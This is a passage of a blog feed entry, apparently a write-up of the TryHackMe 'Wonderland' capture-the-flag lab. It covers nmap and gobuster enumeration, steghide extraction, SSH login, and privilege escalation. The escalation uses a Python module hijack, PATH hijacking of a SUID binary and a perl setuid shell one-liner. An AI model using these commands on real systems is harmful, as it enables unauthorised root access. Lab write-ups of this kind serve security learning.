+    &lt;i&gt;Fall down the rabbit hole and enter wonderland.&lt;&#x2F;i&gt;
+  &lt;&#x2F;div&gt;
+&lt;&#x2F;div&gt;
+&lt;h2 id=&quot;scanning&quot;&gt;Scanning&lt;&#x2F;h2&gt;
+&lt;p&gt;Target IP: 10.10.100.148&lt;&#x2F;p&gt;
+&lt;p&gt;Scanning with nmap, we found two ports are open.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ nmap -sV 10.10.100.148 -v
+Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2024-10-17 14:49 +0545
+.....
+PORT   STATE SERVICE VERSION
+22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80&#x2F;tcp open  http    Golang net&#x2F;http server (Go-IPFS json-rpc or InfluxDB API)
+Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel
+
+.....
+Nmap done: 1 IP address (1 host up) scanned in 39.25 seconds
+&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;&#x2F;h2&gt;
+&lt;p&gt;Enumerating port 80. Content in the home page is &lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;wonderland&#x2F;home_page.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;To find out the directories, we will use gobuster as&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;gobuster dir -u http:&#x2F;&#x2F;10.10.100.148&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;In path &lt;code&gt;&#x2F;r&lt;&#x2F;code&gt;, we have the message&lt;&#x2F;p&gt;
+&lt;pre&gt;
+Keep Going.
+&quot;Would you tell me, please, which way I ought to go from here?&quot;
+&lt;&#x2F;pre&gt;
+&lt;p&gt;We are not getting anything much, faced timeout error. Maybe there is something in the white rabit, as it says follow the white rabbit.&lt;&#x2F;p&gt;
+&lt;p&gt;As we can see, there is &lt;code&gt;hint.txt&lt;&#x2F;code&gt; inside the image. Now extract and follow the hint.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ steghide --info white_rabbit_1.jpg
+&quot;white_rabbit_1.jpg&quot;:
+  format: jpeg
+  capacity: 99.2 KB
+Try to get information about embedded data ? (y&#x2F;n) y
+Enter passphrase: 
+  embedded file &quot;hint.txt&quot;:
+    size: 22.0 Byte
+    encrypted: rijndael-128, cbc
+    compressed: yes
+&lt;&#x2F;pre&gt;
+&lt;p&gt;No need to pass passphrase, &lt;code&gt;steghide --extract -sf white_rabbit_1.jpg&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;After following the path mentioned in the hint, we got the page&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;wonderland&#x2F;open_the_door.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Some content hidden is found there&lt;&#x2F;p&gt;
+&lt;pre&gt;
+alice:HowDothThe......HisShiningTail
+    image src=&quot;&#x2F;img&#x2F;alice_door.png&quot;
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Checking if the information is hidden in alice_door. There is nothing, maybe above hidden content is username and password for ssh. Lets try for this and here we go&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;gaining-access&quot;&gt;Gaining Access&lt;&#x2F;h1&gt;
+&lt;p&gt;Here the root flag and user flag are in inverse place&lt;&#x2F;p&gt;
+&lt;pre&gt;
+Last login: Thu Oct 17 09:37:31 2024 from 10.17.58.84
+alice@wonderland:~$ whoami
+alice
+alice@wonderland:~$ ls
+root.txt  walrus_and_the_carpenter.py
+alice@wonderland:~$ cat root.txt
+cat: root.txt: Permission denied
+alice@wonderland:~$ ls &#x2F;root
+ls: cannot open directory &#x27;&#x2F;root&#x27;: Permission denied
+alice@wonderland:~$ sudo ls &#x2F;root
+[sudo] password for alice: 
+Sorry, user alice is not allowed to execute &#x27;&#x2F;bin&#x2F;ls &#x2F;root&#x27; as root on wonderland.
+alice@wonderland:~$ cat &#x2F;root&#x2F;user.txt
+thm{&quot;Curiouser and curiouser!&quot;}
+&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;&#x2F;h2&gt;
+&lt;pre&gt;
+alice@wonderland:~$ ls -l walrus_and_the_carpenter.py 
+-rw-r--r-- 1 root root 3577 May 25  2020 walrus_and_the_carpenter.py
+alice@wonderland:~$ sudo -l
+[sudo] password for alice: 
+Matching Defaults entries for alice on wonderland:
+    env_reset, mail_badpass,
+    secure_path=&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin
+
+User alice may run the following commands on wonderland:
+    (rabbit) &#x2F;usr&#x2F;bin&#x2F;python3.6 &#x2F;home&#x2F;alice&#x2F;walrus_and_the_carpenter.py
+alice@wonderland:~$ cat walrus_and_the_carpenter.py 
+import random
+poem = &quot;&quot;&quot;The sun was shining on the sea,
+Shining with all his might:
+He did his very best to make
+.....
+And that was scarcely odd, because
+They’d eaten every one.&quot;&quot;&quot;
+
+for i in range(10):
+    line = random.choice(poem.split(&quot;\n&quot;))
+    print(&quot;The line was:\t&quot;, line)
+&lt;&#x2F;pre&gt;
+&lt;p&gt;We can run this file but can not edit. Here &lt;code&gt;random&lt;&#x2F;code&gt; module is imported. Lets make a random.py in the same directory with &lt;&#x2F;p&gt;
+&lt;pre&gt;
+import os
+
+os.system(&quot;&#x2F;bin&#x2F;bash&quot;)
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Running &lt;code&gt;sudo -u rabbit &#x2F;usr&#x2F;bin&#x2F;python3.6 &#x2F;home&#x2F;alice&#x2F;walrus_and_the_carpenter.py&lt;&#x2F;code&gt;, we are now &lt;code&gt;rabbit&lt;&#x2F;code&gt; user. Looking into home directory of rabbit we found a file &lt;code&gt;teaParty&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;SUID bit is on for teaParty&lt;&#x2F;p&gt;
+&lt;pre&gt;
+-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Running the file, we have following output. It shows that date command is executing so we can manipulate it.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+rabbit@wonderland:&#x2F;home&#x2F;rabbit$ .&#x2F;teaParty 
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+Probably by Thu, 17 Oct 2024 11:08:04 +0000
+Ask very nicely, and I will give you some tea while you wait for him
+w
+Segmentation fault (core dumped)
+&lt;&#x2F;pre&gt;
+&lt;p&gt;I have create date file with content &lt;code&gt;&#x2F;bin&#x2F;bash&lt;&#x2F;code&gt; and added it to the path by &lt;code&gt;export PATH=&#x2F;home&#x2F;rabbit:$PATH&lt;&#x2F;code&gt;. Now running the file, we are the hatter&lt;&#x2F;p&gt;
+&lt;pre&gt;
+rabbit@wonderland:&#x2F;home&#x2F;rabbit$ .&#x2F;teaParty 
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+Probably by hatter@wonderland:&#x2F;home&#x2F;rabbit$ whoami
+hatter
+&lt;&#x2F;pre&gt;
+&lt;p&gt;I have password.txt file in the home directory of hatter, which is the password of user hatter. &lt;&#x2F;p&gt;
+&lt;p&gt;By traversing into different user, we are not able to see the root flag. Now using linpeas for the further enumeration.&lt;&#x2F;p&gt;
+&lt;p&gt;We have perl, that can be used to esclate privilege. Used GTFOBins for the exploit &lt;&#x2F;p&gt;
+&lt;pre&gt;
+hatter@wonderland:~$ perl -e &#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;&#x2F;bin&#x2F;sh&quot;;&#x27;
+# 
+# whoami
+root
+# cat &#x2F;home&#x2F;alice&#x2F;root.txt
+thm{Twinkle, twinkle, .............. what you&#x27;re at!}
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Thats all. This is more about the post enumeration and post exploitation things.&lt;&#x2F;p&gt;
+&lt;p&gt;Happy Hacking !!&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+</feed>
